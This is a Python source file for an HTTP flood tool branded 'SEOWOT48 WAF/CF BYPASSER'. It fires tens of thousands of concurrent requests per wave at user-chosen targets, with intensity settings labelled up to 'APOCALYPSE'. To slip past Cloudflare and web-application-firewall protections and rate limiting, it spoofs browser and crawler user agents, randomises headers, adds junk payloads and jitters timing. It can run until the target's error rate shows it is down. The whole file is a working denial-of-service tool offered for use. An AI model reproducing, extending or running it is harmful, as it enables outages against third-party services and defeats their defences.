import asyncio
import aiohttp
import time
import statistics
import threading
import random
import string
import ssl
from dataclasses import dataclass
from typing import List, Dict
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich import box
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.live import Live
from rich.layout import Layout
from rich.columns import Columns
import concurrent.futures

console = Console()

@dataclass
class HasilSerangan:
    kode_status: int
    waktu_respon: float
    ukuran_respon: int = 0
    error: str = None
    timestamp: float = None

class SeranganBypasser:
    def __init__(self):
        self.total_serangan = 0
        self.server_hancur = False
        self.waktu_mulai = None
        self.statistik_real_time = {}
        self.console = Console()
        self.user_agents = self.load_user_agents()
        self.proxies = []
        
    def load_user_agents(self):
        """Database User-Agents untuk bypass detection"""
        return [
            # Real browsers
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            
            # Mobile browsers
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            
            # Legitimate crawlers
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            
            # Various other browsers
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
            "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
        ]
        
    def tampilkan_banner_bypasser(self):
        banner = """
███████ ███████  ██████  ██     ██  ██████  ████████ ██   ██  █████   ██████  
██      ██      ██    ██ ██     ██ ██    ██    ██    ██   ██ ██   ██ ██    ██ 
███████ █████   ██    ██ ██  █  ██ ██    ██    ██    ███████  █████   ██████  
     ██ ██      ██    ██ ██ ███ ██ ██    ██    ██         ██ ██   ██ ██    ██ 
███████ ███████  ██████   ███ ███   ██████     ██         ██  █████   ██████  
                                                                              
      🔥💀 ULTIMATE BYPASSER - PENETRATES ALL DEFENSES 💀🔥                
        """
        
        self.console.print(Panel(
            Align.center(Text(banner, style="bold red")),
            title="🇮🇩 SEOWOT48 WAF/CF BYPASSER EDITION 🇮🇩",
            border_style="bright_red",
            box=box.DOUBLE
        ))

    def generate_realistic_headers(self) -> dict:
        """Generate realistic browser headers untuk bypass detection"""
        base_headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "application/json,text/plain,*/*",
                "*/*"
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9,id;q=0.8",
                "en-US,en;q=0.5",
                "id-ID,id;q=0.9,en;q=0.8",
                "zh-CN,zh;q=0.9,en;q=0.8"
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "style"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        }
        
        # Add random realistic headers
        if random.choice([True, False]):
            base_headers["Referer"] = random.choice([
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://duckduckgo.com/",
                "https://www.facebook.com/",
                "https://twitter.com/"
            ])
            
        if random.choice([True, False]):
            base_headers["DNT"] = "1"
            
        # Random browser-specific headers
        if "Chrome" in base_headers["User-Agent"]:
            base_headers["sec-ch-ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
            base_headers["sec-ch-ua-mobile"] = "?0"
            base_headers["sec-ch-ua-platform"] = '"Windows"'
            
        return base_headers

    def generate_bypass_payload(self, size_kb: int = 1) -> dict:
        """Generate payload yang terlihat legitimate"""
        payloads = [
            # Form submission simulation
            {
                "username": ''.join(random.choices(string.ascii_lowercase, k=8)),
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
                "email": f"{''.join(random.choices(string.ascii_lowercase, k=6))}@gmail.com",
                "action": "login"
            },
            
            # Search query simulation
            {
                "q": random.choice([
                    "best products 2024",
                    "how to install software",
                    "weather forecast",
                    "news today",
                    "online shopping"
                ]),
                "type": "search",
                "page": random.randint(1, 10)
            },
            
            # API-like payload
            {
                "data": {
                    "user_id": random.randint(1000, 9999),
                    "session": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                    "timestamp": int(time.time()),
                    "action": random.choice(["view", "click", "scroll", "hover"])
                }
            },
            
            # Large content flood (if enabled)
            {
                "content": ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=size_kb*1024)),
                "type": "bulk_data"
            }
        ]
        
        return random.choice(payloads)

    def create_ssl_context(self):
        """Create SSL context that bypasses certificate errors"""
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        return ssl_context

    async def bypasser_request(self, session: aiohttp.ClientSession, target: str, config: dict) -> HasilSerangan:
        start_time = time.time()
        
        try:
            # Random jitter untuk bypass rate limiting
            await asyncio.sleep(random.uniform(0.001, 0.1))
            
            # Random method selection
            methods = ["GET", "POST", "PUT", "HEAD", "OPTIONS"] if config.get('enable_method_mix') else ["GET", "POST"]
            method = random.choice(methods)
            
            # Prepare realistic payload
            data = None
            if method in ["POST", "PUT"] and config.get('enable_payloads'):
                data = self.generate_bypass_payload(random.randint(1, 3))
            
            # Generate realistic headers
            headers = self.generate_realistic_headers()
            
            # Add random delays to mimic human behavior
            if config.get('enable_human_simulation'):
                await asyncio.sleep(random.uniform(0.1, 2.0))
            
            async with session.request(
                method=method,
                url=target,
                json=data if data and random.choice([True, False]) else None,
                data=data if data and random.choice([True, False]) else None,
                headers=headers,
                ssl=self.create_ssl_context(),
                timeout=aiohttp.ClientTimeout(total=30, connect=15),
                allow_redirects=True
            ) as response:
                content = await response.read()
                response_time = time.time() - start_time
                
                return HasilSerangan(
                    kode_status=response.status,
                    waktu_respon=response_time,
                    ukuran_respon=len(content),
                    timestamp=time.time()
                )
                
        except Exception as e:
            response_time = time.time() - start_time
            return HasilSerangan(0, response_time, 0, str(e), time.time())

    async def bypass_wave_attack(self, targets: List[str], config: dict) -> List[HasilSerangan]:
        """Execute wave attack dengan bypass techniques"""
        
        # More aggressive connector settings
        connector = aiohttp.TCPConnector(
            limit=config['max_concurrent'],
            limit_per_host=config['max_concurrent'] // len(targets),
            use_dns_cache=False,  # Avoid DNS caching
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            force_close=True,  # Force close connections
            ttl_dns_cache=60,
            ssl=self.create_ssl_context()
        )
        
        timeout = aiohttp.ClientTimeout(total=45, connect=20)
        
        hasil_wave = []
        
        # Custom session setup untuk bypass
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            skip_auto_headers=['User-Agent'],  # We'll set our own
            trust_env=True,
            cookie_jar=aiohttp.CookieJar()  # Handle cookies properly
        ) as session:
            
            # Distributed semaphore untuk rate limiting per target
            semaphores = {target: asyncio.Semaphore(config['max_concurrent'] // len(targets)) for target in targets}
            
            async def bypass_single_attack():
                target = random.choice(targets)
                async with semaphores[target]:
                    result = await self.bypasser_request(session, target, config)
                    hasil_wave.append(result)
                    return result
            
            # Execute with smart batching
            total_requests = config['request_per_wave']
            batch_size = min(config['max_concurrent'], 1000)  # Smaller batches
            
            for i in range(0, total_requests, batch_size):
                batch_tasks = []
                current_batch_size = min(batch_size, total_requests - i)
                
                for _ in range(current_batch_size):
                    task = bypass_single_attack()
                    batch_tasks.append(task)
                
                # Execute batch with better error handling
                try:
                    await asyncio.gather(*batch_tasks, return_exceptions=True)
                except Exception as e:
                    self.console.print(f"⚠️ Batch error (continuing): {e}")
                
                # Adaptive delay based on success rate
                if config.get('enable_adaptive_delay'):
                    recent_errors = len([r for r in hasil_wave[-100:] if r.kode_status != 200])
                    if recent_errors > 80:  # High error rate
                        await asyncio.sleep(random.uniform(1, 3))
                    elif recent_errors > 50:
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                    else:
                        await asyncio.sleep(random.uniform(0.1, 0.5))
        
        return hasil_wave

    def input_konfigurasi_bypasser(self):
        self.console.print("\n💀 [bold red]BYPASSER CONFIGURATION:[/bold red]\n")
        
        # Multiple targets
        self.console.print("🎯 [bold cyan]Target Mode:[/bold cyan]")
        self.console.print("1. Single Target")
        self.console.print("2. Multiple Targets")
        mode = Prompt.ask("Pilih mode", choices=["1", "2"], default="1")
        
        targets = []
        if mode == "1":
            url = Prompt.ask("🌐 [bold blue]URL/IP target (with CF/WAF)[/bold blue]", 
                           default="https://example.com")
            targets = [url]
        else:
            self.console.print("🎯 Masukkan multiple targets (ketik 'done' untuk selesai):")
            while True:
                target = Prompt.ask("Target URL (atau 'done')")
                if target.lower() == 'done':
                    break
                targets.append(target)
            if not targets:
                targets = ["https://example.com"]

        # Attack intensity
        self.console.print("\n⚡ [bold yellow]Bypass Intensity:[/bold yellow]")
        self.console.print("1. Stealth (1000 req/wave, slow)")
        self.console.print("2. Balanced (5000 req/wave)")
        self.console.print("3. Aggressive (15000 req/wave)")
        self.console.print("4. NUCLEAR (30000 req/wave)")
        self.console.print("5. APOCALYPSE (50000+ req/wave)")
        
        intensity = Prompt.ask("Pilih intensity", choices=["1","2","3","4","5"], default="3")
        intensitas_map = {
            "1": (1000, 20),
            "2": (5000, 50), 
            "3": (15000, 150),
            "4": (30000, 300),
            "5": (75000, 500)
        }
        request_per_wave, max_concurrent = intensitas_map[intensity]
        
        # Bypass features
        enable_method_mix = Confirm.ask("🔀 [bold blue]Enable method mixing (GET/POST/PUT)?[/bold blue]", default=True)
        enable_payloads = Confirm.ask("📤 [bold blue]Enable realistic payloads?[/bold blue]", default=True)
        enable_human_simulation = Confirm.ask("🤖 [bold blue]Enable human behavior simulation?[/bold blue]", default=True)
        enable_adaptive_delay = Confirm.ask("⚡ [bold blue]Enable adaptive delay (smart rate limiting)?[/bold blue]", default=True)
        
        # Duration settings
        duration_mode = Prompt.ask("⏰ [bold cyan]Duration mode[/bold cyan] (1=Until Down, 2=Time Limit)", 
                                 choices=["1", "2"], default="2")
        
        time_limit = None
        if duration_mode == "2":
            time_limit = IntPrompt.ask("🕐 Batas waktu serangan (menit)?", default=15)
        
        # Error threshold
        error_threshold = IntPrompt.ask("🚨 [bold red]Error threshold untuk deteksi DOWN (%)?[/bold red]", 
                                      default=95, show_default=True)
        
        return {
            'targets': targets,
            'request_per_wave': request_per_wave,
            'max_concurrent': max_concurrent,
            'enable_method_mix': enable_method_mix,
            'enable_payloads': enable_payloads,
            'enable_human_simulation': enable_human_simulation,
            'enable_adaptive_delay': enable_adaptive_delay,
            'time_limit': time_limit,
            'error_threshold': error_threshold
        }

    def create_live_bypasser_dashboard(self, wave_count: int, hasil_terkini: List[HasilSerangan], 
                                     total_time: float, config: dict) -> Table:
        """Create live dashboard untuk bypass mode"""
        
        if hasil_terkini:
            sukses = [r for r in hasil_terkini if r.kode_status in [200, 201, 202, 204]]
            redirects = [r for r in hasil_terkini if 300 <= r.kode_status < 400]
            blocks = [r for r in hasil_terkini if r.kode_status in [403, 429, 503, 520, 521, 522, 523, 524]]
            errors = [r for r in hasil_terkini if r.kode_status not in [200, 201, 202, 204] and not (300 <= r.kode_status < 400)]
            
            success_rate = (len(sukses) / len(hasil_terkini)) * 100
            block_rate = (len(blocks) / len(hasil_terkini)) * 100
            
            if sukses:
                avg_response = statistics.mean([r.waktu_respon for r in sukses]) * 1000
                total_data = sum([r.ukuran_respon for r in sukses]) / 1024 / 1024
            else:
                avg_response = 0
                total_data = 0
                
            rps = len(hasil_terkini) / max(total_time, 1)
        else:
            success_rate = block_rate = avg_response = total_data = rps = 0
            sukses = redirects = blocks = errors = []
        
        # Bypass status indicators
        if block_rate < 10:
            bypass_status = "🔥 BYPASS SUCCESS"
        elif block_rate < 30:
            bypass_status = "⚡ PARTIAL BYPASS"
        elif block_rate < 60:
            bypass_status = "⚠️ DETECTED/BLOCKED"
        else:
            bypass_status = "🛡️ FULLY BLOCKED"
            
        if success_rate > 80:
            target_status = "💀 OVERWHELMED"
        elif success_rate > 50:
            target_status = "🩸 STRUGGLING"
        else:
            target_status = "🛡️ DEFENDING"
        
        dashboard = Table(
            title=f"🔥💀 SEOWOT48 BYPASSER LIVE DASHBOARD 💀🔥", 
            box=box.DOUBLE_EDGE, 
            border_style="bright_red"
        )
        
        dashboard.add_column("Metric", style="bold white", justify="left")
        dashboard.add_column("Value", style="bright_green", justify="right") 
        dashboard.add_column("Status", style="bold yellow", justify="center")
        
        dashboard.add_row("⚔️ Wave Number", f"#{wave_count}", bypass_status)
        dashboard.add_row("⏱️ Attack Duration", f"{total_time:.1f}s", "🕐")
        dashboard.add_row("🚀 Total Fired", f"{len(hasil_terkini):,}", "💥")
        dashboard.add_row("💥 Fire Rate", f"{rps:.1f} req/s", "⚡")
        dashboard.add_row("✅ Successful", f"{len(sukses):,} ({success_rate:.1f}%)", "💚")
        dashboard.add_row("🔄 Redirects", f"{len(redirects):,}", "🔄")
        dashboard.add_row("🛡️ Blocked/Limited", f"{len(blocks):,} ({block_rate:.1f}%)", "🚫")
        dashboard.add_row("❌ Errors", f"{len(errors):,}", "💔")
        dashboard.add_row("⚡ Avg Response", f"{avg_response:.0f}ms", "📈")
        dashboard.add_row("📦 Data Retrieved", f"{total_data:.2f}MB", "📊")
        dashboard.add_row("🎯 Target Status", target_status, "🔥")
        dashboard.add_row("🛡️ Bypass Status", bypass_status, "🎯")
        
        return dashboard

    async def ultimate_bypass_assault(self, config: dict):
        """Main bypass assault dengan advanced techniques"""
        
        self.console.print("\n💀 [bold red]ULTIMATE BYPASS ASSAULT ACTIVATED![/bold red]")
        self.console.print("🛡️ [bold yellow]PENETRATING ALL DEFENSES...[/bold yellow]")
        self.console.print("🔥 [bold red]COMMENCING STEALTH BOMBARDMENT...[/bold red]\n")
        
        # Dramatic countdown
        for i in range(3, 0, -1):
            self.console.print(f"🥷 BYPASS LAUNCHING IN {i}... 🥷", style="bold red blink")
            await asyncio.sleep(1)
        
        self.console.print("🚀 [bold green blink]BYPASS ASSAULT COMMENCED![/bold green blink]\n")
        
        self.waktu_mulai = time.time()
        wave_count = 0
        all_results = []
        
        try:
            while not self.server_hancur:
                wave_count += 1
                
                self.console.print(f"\n💥 [bold red]BYPASS WAVE {wave_count} - PENETRATING DEFENSES![/bold red]")
                
                hasil_wave = await self.bypass_wave_attack(config['targets'], config)
                all_results.extend(hasil_wave)
                
                current_time = time.time() - self.waktu_mulai
                
                # Smart detection of server down
                if hasil_wave:
                    sukses = len([r for r in hasil_wave if r.kode_status in [200, 201, 202, 204]])
                    success_rate = (sukses / len(hasil_wave)) * 100
                    error_rate = 100 - success_rate
                    
                    if error_rate >= config['error_threshold']:
                        self.server_hancur = True
                        break
                
                dashboard = self.create_live_bypasser_dashboard(wave_count, hasil_wave, current_time, config)
                self.console.print(dashboard)
                
                # Check time limit
                if config['time_limit'] and current_time > (config['time_limit'] * 60):
                    self.console.print("\n⏰ [bold yellow]Time limit reached![/bold yellow]")
                    break
                
                # Adaptive wave delay
                if config.get('enable_adaptive_delay') and hasil_wave:
                    recent_blocks = len([r for r in hasil_wave if r.kode_status in [403, 429, 503]])
                    block_rate = (recent_blocks / len(hasil_wave)) * 100
                    
                    if block_rate > 70:
                        await asyncio.sleep(random.uniform(10, 30))  # High detection, wait longer
                    elif block_rate > 40:
                        await asyncio.sleep(random.uniform(5, 15))
                    else:
                        await asyncio.sleep(random.uniform(1, 5))    # Low detection, proceed quickly
                else:
                    await asyncio.sleep(2)
                    
        except KeyboardInterrupt:
            self.console.print("\n🛑 [bold red]BYPASS ASSAULT TERMINATED![/bold red]")
        
        self.show_bypass_results(wave_count, all_results, time.time() - self.waktu_mulai, config)

    def show_bypass_results(self, total_waves: int, all_results: List[HasilSerangan], 
                          total_time: float, config: dict):
        """Show bypass results dengan detailed analysis"""
        
        self.console.print("\n" + "="*100)
        
        if all_results:
            sukses = [r for r in all_results if r.kode_status in [200, 201, 202, 204]]
            redirects = [r for r in all_results if 300 <= r.kode_status < 400]
            blocks = [r for r in all_results if r.kode_status in [403, 429, 503, 520, 521, 522, 523, 524]]
            
            success_rate = (len(sukses) / len(all_results)) * 100
            block_rate = (len(blocks) / len(all_results)) * 100
            
            # Victory determination
            if success_rate > 70 and block_rate < 20:
                victory_banner = """
🔥💀 BYPASS SUCCESS! ALL DEFENSES PENETRATED! 💀🔥
════════════════════════════════════════════════════
🥷 WAF BYPASSED ✓ | CF PENETRATED ✓ | TARGET DESTROYED ✓
════════════════════════════════════════════════════
                """
                self.console.print(Panel(
                    Align.center(Text(victory_banner, style="bold green on black")),
                    title="🏆 ULTIMATE BYPASS VICTORY! 🏆",
                    border_style="bright_green",
                    box=box.DOUBLE
                ))
            elif success_rate > 40:
                self.console.print(Panel(
                    Align.center(Text("⚡ PARTIAL BYPASS SUCCESS - DEFENSES BREACHED! ⚡", style="bold yellow")),
                    title="🎯 BYPASS PARTIAL SUCCESS",
                    border_style="bright_yellow",
                    box=box.DOUBLE
                ))
            else:
                self.console.print(Panel(
                    Align.center(Text("🛡️ DEFENSES HELD - BYPASS DETECTED & BLOCKED 🛡️", style="bold red")),
                    title="⚠️ BYPASS BLOCKED",
                    border_style="bright_red",
                    box=box.DOUBLE
                ))
            
            # Detailed bypass analysis
            bypass_table = Table(
                title="🔥💀 SEOWOT48 BYPASS ANALYSIS REPORT 💀🔥", 
                box=box.DOUBLE_EDGE, 
                border_style="bright_magenta"
            )
            
            bypass_table.add_column("Bypass Statistics", style="bold white", justify="left")
            bypass_table.add_column("Results", style="bright_green", justify="right")
            bypass_table.add_column("Assessment", style="bold yellow", justify="center")
            
            avg_rps = len(all_results) / total_time if total_time > 0 else 0
            total_data_mb = sum([r.ukuran_respon for r in sukses]) / 1024 / 1024 if sukses else 0
            
            bypass_table.add_row("⚔️ Total Waves", f"{total_waves}", "💥")
            bypass_table.add_row("⏱️ Campaign Duration", f"{total_time:.1f} seconds", "🕐")
            bypass_table.add_row("🚀 Total Attacks Fired", f"{len(all_results):,}", "💥")
            bypass_table.add_row("💥 Average Fire Rate", f"{avg_rps:.1f} req/sec", "⚡")
            bypass_table.add_row("✅ Successful Bypasses", f"{len(sukses):,} ({success_rate:.1f}%)", "💚")
            bypass_table.add_row("🔄 Redirected", f"{len(redirects):,}", "🔄")
            bypass_table.add_row("🛡️ Blocked by Defense", f"{len(blocks):,} ({block_rate:.1f}%)", "🚫")
            bypass_table.add_row("📦 Data Exfiltrated", f"{total_data_mb:.2f} MB", "📊")
            
            # Bypass effectiveness
            if block_rate < 10:
                effectiveness = "🔥 STEALTH MASTER"
            elif block_rate < 30:
                effectiveness = "⚡ NINJA LEVEL"
            elif block_rate < 60:
                effectiveness = "⚠️ DETECTED"
            else:
                effectiveness = "🛡️ BLOCKED"
                
            bypass_table.add_row("🥷 Bypass Effectiveness", effectiveness, "🎯")
            
            self.console.print(bypass_table)
            
            # Response analysis
            if sukses:
                response_times = [r.waktu_respon * 1000 for r in sukses]
                response_analysis = Table(title="⚡ Successful Response Analysis", box=box.ROUNDED)
                response_analysis.add_column("Metric", style="cyan")
                response_analysis.add_column("Value", style="green", justify="right")
                
                response_analysis.add_row("Fastest Bypass", f"{min(response_times):.0f}ms")
                response_analysis.add_row("Average Response", f"{statistics.mean(response_times):.0f}ms")
                response_analysis.add_row("Slowest Response", f"{max(response_times):.0f}ms")
                
                self.console.print(response_analysis)

        # Final bypass verdict
        if success_rate > 70:
            verdict = "🏆🥷 SEOWOT48 BYPASSER DOMINATED! ALL DEFENSES DESTROYED! 🥷🏆"
            verdict_style = "bold white on green"
        elif success_rate > 40:
            verdict = "⚡🔥 PARTIAL PENETRATION! DEFENSES BREACHED SIGNIFICANTLY! 🔥⚡"
            verdict_style = "bold black on yellow"
        else:
            verdict = "🛡️⚔️ DEFENSES HELD STRONG! IMPROVE BYPASS TECHNIQUES! ⚔️🛡️"
            verdict_style = "bold white on red"
        
        self.console.print("\n")
        self.console.print(Panel(
            Align.center(Text(verdict, style=verdict_style)),
            title="🎯 FINAL BYPASS VERDICT",
            border_style="bright_cyan",
            box=box.DOUBLE
        ))

def main():
    bypasser = SeranganBypasser()
    
    while True:
        try:
            bypasser.tampilkan_banner_bypasser()
            
            config = bypasser.input_konfigurasi_bypasser()
            
            # Reset state
            bypasser.server_hancur = False
            bypasser.total_serangan = 0
            
            asyncio.run(bypasser.ultimate_bypass_assault(config))
            
            console.print("\n")
            ulang = Confirm.ask("🔄 [bold blue]Launch another bypass assault?[/bold blue]", default=True)
            if not ulang:
                console.print("👋 [bold green]SEOWOT48 BYPASSER signing off! Defenses penetrated![/bold green]")
                break
            else:
                console.clear()
                
        except KeyboardInterrupt:
            console.print("\n❌ [bold red]BYPASSER PROTOCOL TERMINATED![/bold red]")
            break
        except Exception as e:
            console.print(f"\n💥 [bold red]CRITICAL ERROR: {e}[/bold red]")
            ulang = Confirm.ask("🔄 Restart bypasser?", default=True)
            if not ulang:
                break

if __name__ == "__main__":
    main()